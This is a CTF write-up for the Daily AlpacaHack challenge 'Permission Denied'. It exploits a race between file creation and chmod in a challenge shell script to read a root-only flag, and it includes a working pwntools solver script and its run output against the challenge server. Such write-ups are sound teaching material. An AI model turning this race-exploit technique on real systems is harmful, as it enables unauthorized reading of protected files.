---
title: "Daily AlpacaHack: Permission Denied Writeup"
description: "At this point I don't know what to put here."
pubDate: 2026-04-30
tags: ["alpacahack", "misc", "unix permissions"]
---

In this Daily AlpacaHack challenge, we are given a simple goal: read `flag.txt` from a Debian Trixie shell. The flag file is created by root in `/app`, the container's `WORKDIR`, and then set to mode `0400`, which means that only the owner (root) can read it. An important detail is that `chal.sh` drops us into a shell as the `nobody` user with `runuser -u nobody -- sh`, so we cannot read the file directly once the permissions are locked down.

# The challenge

We are given both the connection to the shell (via netcat) and the source code to instantiate the challenge: `Dockerfile`, `docker-compose.yml` (not relevant here), and `chal.sh` (which is the entrypoint of the container). Let's take a look at `chal.sh` and `Dockerfile`:

```dockerfile
FROM python:3.14.4-slim-trixie
RUN apt-get update && apt-get install -yq socat
WORKDIR /app
COPY --chmod=400 chal.sh ./
CMD ["socat", "tcp-listen:1337,fork,reuseaddr", "exec:'bash chal.sh',stderr,pty,ctty,setsid,echo=0"]
```

```bash
echo Alpaca{REDACTED} > flag.txt
chmod 400 flag.txt
runuser -u nobody -- sh
rm flag.txt
```

As we can see, the `Dockerfile` sets up a Debian Trixie container with Python and socat installed, and it runs `chal.sh` when a connection is made to port 1337. The `WORKDIR /app` line is important here: `flag.txt` is created in `/app`, not in a user home directory. Then `chal.sh` writes the flag to `flag.txt`, sets its permissions to `0400`, and runs a shell as the `nobody` user. After that shell exits, it deletes the `flag.txt` file.

There are some important details here. First of all, because `runuser` blocks, `rm flag.txt` only runs after the inner shell finishes. Another important point is that socat's `fork` option re-executes `chal.sh` on every new TCP connection, so each connection re-runs `echo`, `chmod`, and (after its inner shell exits) `rm`. This means short-lived trigger connections can delete the file and let later connections create it again, opening a race condition between creation and permission tightening.

# The exploit

As we previously said, every time we connect to the shell, the `chal.sh` script is executed. The `rm` step from a prior connection is what makes the race exploitable: shell redirection (`echo > flag.txt`) only **truncates** an existing file, it does not reset its mode, so without a prior `rm` the file would stay at `0400` forever. Once a previous instance has removed `flag.txt`, the next `echo Alpaca{REDACTED} > flag.txt` recreates it with the default permissions of `0644`, and only then does `chmod 400` tighten them again. This means that if we read the contents of `flag.txt` before the `chmod` command is executed, we can read the flag while the permissions are still `0644`. The window between `echo > flag.txt` and `chmod 400 flag.txt` is very small, but it is not zero; a busy-looping `cat` plus many parallel trigger connections raises the hit probability enough to be practical. So to exploit this we can:

1. In one terminal, connect to the shell, and execute a loop that continuously reads the contents of `flag.txt`. Most attempts will fail with "permission denied", so in the solver we redirect those errors away and only keep successful reads.

2. Then we can start spawning new shells in another thread, which will trigger the `chal.sh` script and create the `flag.txt` file with the flag, and then set its permissions to `0400`. With enough attempts, our `cat` will land between `echo` and `chmod`, while the file is still `0644`, allowing us to read the flag before the permissions are changed.

# Solver

Let's take a look at the solver script:

We start by importing the necessary libraries and defining the host and port of the challenge.

```python
from pwn import *
import threading

HOST = '34.170.146.252'
PORT = 31900
```

Now we define a helper function that will run on an independent thread and continuously spawn new shells to trigger the `chal.sh` script and create the `flag.txt` file. This will allow us to exploit the race condition and read the flag before the permissions are changed.

```python
def trigger():
    for _ in range(20):
        try:
            log.info(f"Triggering attempt {_+1}")
            r = remote(HOST, PORT, level='error')
            r.sendline(b'exit')
            r.close()
        except:
            pass
```

The `level='error'` argument on the trigger connections keeps pwntools from printing connection logs for every trigger attempt, while leaving the main connection's useful status logs visible.

Now we initialize the main connection to the shell and make it continuously read the contents of `flag.txt` by running `while true; do cat flag.txt 2>/dev/null; done`. This will print the flag to the terminal whenever `flag.txt` is created and before its permissions are changed.

```python
log.info("Starting main connection to read the flag")
r = remote(HOST, PORT)
r.sendline(b'while true; do cat flag.txt 2>/dev/null; done')
```

Now we initialize the `trigger` helper function in a new thread.

```python
log.info("Started reading flag connection, now starting race condition trigger")
threading.Thread(target=trigger).start()
```

Finally, we receive any output from the main connection until the flag prefix `Alpaca{` appears. At this point we print the flag and close the connection.

```python
r.recvuntil(b'Alpaca{')
flag = b'Alpaca{' + r.recvline().strip()

log.success(f"Flag recovered: {flag.decode()}")
r.close()
```

# Results

After running the solver we get the following output:

```log
python solver.py
[*] Starting main connection to read the flag
[+] Opening connection to 34.170.146.252 on port 31900: Done
[*] Started reading flag connection, now starting race condition trigger
[*] Triggering attempt 1
[*] Triggering attempt 2
[*] Triggering attempt 3
[*] Triggering attempt 4
[*] Triggering attempt 5
[+] Flag recovered: Alpaca{h4s_fu11_p3rm1ss10ns_0v3r_3v3ry7h1ng}
[*] Closed connection to 34.170.146.252 port 31900
[*] Triggering attempt 6
[*] Triggering attempt 7
[*] Triggering attempt 8
[*] Triggering attempt 9
[*] Triggering attempt 10
[*] Triggering attempt 11
[*] Triggering attempt 12
[*] Triggering attempt 13
[*] Triggering attempt 14
[*] Triggering attempt 15
[*] Triggering attempt 16
[*] Triggering attempt 17
[*] Triggering attempt 18
[*] Triggering attempt 19
[*] Triggering attempt 20
```

# Conclusion

As we can see, the solver successfully recovers the flag `Alpaca{h4s_fu11_p3rm1ss10ns_0v3r_3v3ry7h1ng}` on the 5th triggering attempt. Since this is a non-deterministic race, it can vary between runs (so more than 20 triggers might be needed in some cases), but it still shows the main problem of the challenge: it's a classic TOCTOU shape spread across three non-atomic steps (`rm` from one connection, then `echo` and `chmod` from another) with no synchronization between concurrent `chal.sh` instances or with the `nobody` reader. Since the OS scheduler is free to interleave these steps with our `cat`, we can land a read while the file is at `0644`.

# Greetings

As always, thanks to the Daily AlpacaHack team for hosting these daily challenges, and especially this time to minaminao as the admin of Daily AlpacaHack and author of this challenge. It was a fun challenge to solve, quite different from what I usually do, and it was nice to solve~!
